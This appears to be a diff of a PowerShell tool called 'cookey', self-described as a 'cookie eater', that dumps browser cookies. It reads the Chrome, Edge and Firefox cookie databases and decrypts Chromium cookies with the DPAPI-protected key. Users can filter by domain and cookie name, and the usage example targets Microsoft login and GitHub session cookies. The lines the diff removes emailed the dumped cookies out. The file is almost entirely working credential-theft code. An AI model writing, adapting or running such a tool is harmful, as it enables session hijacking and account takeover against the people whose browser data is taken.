@@ -1,81 +1,100 @@
-﻿Import-Module PSSQLite
-Import-Module $PSScriptRoot\core\Banner
-Import-Module $PSScriptRoot\core\Menu
-Import-Module $PSScriptRoot\core\Constants
-Import-Module $PSScriptRoot\core\core
+﻿<#
+.SYNOPSIS
+    A cookie eater tool.
+.DESCRIPTION
+    Dump the cookie values of the main browsers according to the preferences of the user.
+.PARAMETER Dump
+    Specifies the operation to dump the cookie values according to the values of the other parameters.
+.PARAMETER Browser
+    Specifies the browser to take cookies. Currently <Chrome|Firefox|Edge>.
+.PARAMETER Domain
+    Specifies which domains the user wants to catch the related cookies.
+.PARAMETER CookieName
+    Specifies which particular cookies, for specified domains, must be caught.
+.EXAMPLE
+    C:\PS> 
+    .\cookey.ps1 -Dump -Browser Chrome -Domain .login.microsoftonline.com,github.com -CookieName AADSSO,_device_id
+.NOTES
+    Author: D3vil0per
+    Date:   June 24, 2021    
+#>
+Param(
+        [Parameter()][switch]$Dump,
+        [Parameter()][switch]$Import,
+        [Parameter()][string]$Browser,
+        [Parameter()][string[]]$Domain,
+        [Parameter()][string[]]$CookieName
+)
+
+Import-Module PSSQLite
+Import-Module $PSScriptRoot\lib\banner
+Import-Module $PSScriptRoot\lib\datatype
+Import-Module $PSScriptRoot\lib\modules
 
 Add-Type -Assembly System.Security
 Show-Banner
-Set-Constant
 
+$object = New-Browser
 
-$result = Show-CookeyMenu
-switch ($result) {
-        0 { 
-            $decKey = DPAPIDecryptKey $chromeKeyPath
-            $Database = $chromeCookiePath
-            $DBTable = "cookies"
-            $hostcolumn = "host_key"
-            $valuecolumn = "encrypted_value"
+    if($Dump){
+        
+        switch ($Browser) {
+        {($_ -eq $chromeName) -or ($_ -eq $edgeName)} {
+            
+            $object.DBTable = "cookies"
+            $object.hostcolumn = "host_key"
+            $object.valuecolumn = "encrypted_value"
+            $object.requireEncryption = $true
+
+            if ($_ -eq $chromeName) {
+                $object.decKey = DPAPIDecryptKey $chromeKeyPath
+                $object.Database = $chromeCookiePath
+            }
+            elseif ($_ -eq $edgeName) {
+                $object.decKey = DPAPIDecryptKey $edgeKeyPath
+                $object.Database = $edgeCookiePath
+            }
           }
-        1 {
-            $decKey = $null
-            $Database = $firefoxCookiePath
-            $DBTable = "moz_cookies"
-            $hostcolumn = "host"
-            $valuecolumn = "value"
+        $firefoxName {
+            $object.decKey = $null
+            $object.Database = $firefoxCookiePath
+            $object.DBTable = "moz_cookies"
+            $object.hostcolumn = "host"
+            $object.valuecolumn = "value"
+            $object.requireEncryption = $false
           }
-        2 {
-            $decKey = DPAPIDecryptKey $edgeKeyPath
-            $Database = $edgeCookiePath
-            $DBTable = "cookies"
-            $hostcolumn = "host_key"
-            $valuecolumn = "encrypted_value"
-          }
+        }
+        $query = "SELECT $($object.hostcolumn), name, $($object.valuecolumn), path FROM $($object.DBTable)"
+        
+        if ($($PSBoundParameters.ContainsKey('Domain'))) {
+            foreach ($dom in $Domain) 
+            {
+                if ($($PSBoundParameters.ContainsKey('CookieName'))) {
+                    foreach ($element in $CookieName) 
+                    {
+                        #CAST object[] IMPORTANT!! Otherwise the variable does not display the information
+                        [object[]]$encAll = Invoke-SqliteQuery -DataSource $($object.Database) -Query $query | Where-Object {$_.$($object.hostcolumn) -eq $dom -and $_.name -match $element}
+                        PrintResult $object $encAll
+                    }
+                }
+                else {                    
+                    [object[]]$encAll = Invoke-SqliteQuery -DataSource $($object.Database) -Query $query | Where-Object {$_.$($object.hostcolumn) -eq $dom}
+                    PrintResult $object $encAll
+                }             
+            }
+        }
+        else {
+            [object[]]$encAll = Invoke-SqliteQuery -DataSource $($object.Database) -Query $query
+            PrintResult $object $encAll
+        }     
+        if ($($object.requireEncryption))
+        {
+            Write-Host "DECRYPTION KEY [HEX]: " -ForegroundColor Green -NoNewline; Write-Host "$($object.decKey)" -ForegroundColor Yellow
+            Write-Host ""
+            Write-Host ""
+        }
     }
 
-$choice = Show-ChoicesMenu
-if ($choice -ne 0)
-{
-   importCookieDB $Database $DBTable
-   return 0
-}
-
-$query = "SELECT $hostcolumn, name, $valuecolumn, path FROM $DBTable"
-
-$hostmenu = Show-HostMenu
-
-if ($hostmenu -eq 1)
-{
-   $targethost = Read-Host "Please enter the host"
-   $cookiemenu = Show-CookieNameMenu
-   if ($cookiemenu -eq 1)
-   {
-      $targetcookie = Read-Host "Please enter the cookie name"
-      $encAll = Invoke-SqliteQuery -DataSource $Database -Query $query | Where-Object {$_.$hostcolumn -eq $targethost -and $_.name -eq $targetcookie}
-   }
-   else
-   {
-      $encAll = Invoke-SqliteQuery -DataSource $Database -Query $query | Where-Object {$_.$hostcolumn -eq $targethost}
-   }
-   
-}
-else
-{
-   $encAll = Invoke-SqliteQuery -DataSource $Database -Query $query   
-}
-
-$out = Show-SendEmail
-
-if ($out -eq 0)
-{
-   Start-Transcript -Path .\output.txt
-   PrintResult $encAll $decKey $hostcolumn $valuecolumn
-   Stop-Transcript
-   SendEmail
-   Remove-Item .\output.txt
-}
-else
-{
-   PrintResult $encAll $decKey $hostcolumn $valuecolumn
-}
+    if($Import){
+        Write-Host "WORK IN PROGRESS"
+    }
